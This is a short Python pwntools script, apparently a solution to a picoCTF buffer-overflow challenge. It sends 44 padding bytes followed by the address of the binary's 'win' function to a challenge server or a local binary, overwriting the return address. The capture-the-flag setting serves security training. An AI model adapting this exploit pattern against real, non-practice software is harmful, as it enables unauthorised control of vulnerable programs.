from pwn import *

LOCAL = False

if LOCAL:
    io = process('./vuln')
else:
    io = remote('saturn.picoctf.net', 61366)  
elf      = ELF('./vuln')
win_addr = elf.sym['win']          
offset = 44

payload  = b'A' * offset
payload += p32(win_addr)

io.sendlineafter(b'string: \n', payload)
print(io.recvall(timeout=3).decode())
